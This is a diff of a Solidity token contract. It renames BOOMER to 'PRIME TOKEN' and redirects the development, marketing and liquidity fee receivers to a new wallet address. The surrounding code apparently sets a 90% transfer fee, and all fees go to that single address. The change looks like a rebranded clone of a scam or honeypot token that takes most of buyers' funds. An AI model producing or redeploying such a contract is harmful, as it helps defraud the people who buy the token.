@@ -145,10 +145,10 @@ interface IRouter {
         uint deadline) external;
 }
 
-contract BOOMER is IERC20, Ownable {
+contract PRIME is IERC20, Ownable {
     using SafeMath for uint256;
-    string private constant _name = 'Boomer';
-    string private constant _symbol = 'BOOMER';
+    string private constant _name = 'PRIME TOKEN';
+    string private constant _symbol = 'PRIME';
     uint8 private constant _decimals = 9;
     uint256 private _totalSupply = 666666666 * (10 ** _decimals);
     mapping (address => uint256) _balances;
@@ -174,9 +174,9 @@ contract BOOMER is IERC20, Ownable {
     uint256 private transferFee = 9000;
     uint256 private denominator = 10000;
     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
-    address internal development_receiver = 0x4067678418239F6C4E621bb77BC21E5F1D3C1475; 
-    address internal marketing_receiver = 0x4067678418239F6C4E621bb77BC21E5F1D3C1475;
-    address internal liquidity_receiver = 0x4067678418239F6C4E621bb77BC21E5F1D3C1475;
+    address internal development_receiver = 0xAE0811f046A5dBe392E367DAf9AE8BBd9f11eb49; 
+    address internal marketing_receiver = 0xAE0811f046A5dBe392E367DAf9AE8BBd9f11eb49;
+    address internal liquidity_receiver = 0xAE0811f046A5dBe392E367DAf9AE8BBd9f11eb49;
     uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
     uint256 public _maxSellAmount = ( _totalSupply * 200 ) / 10000;
     uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
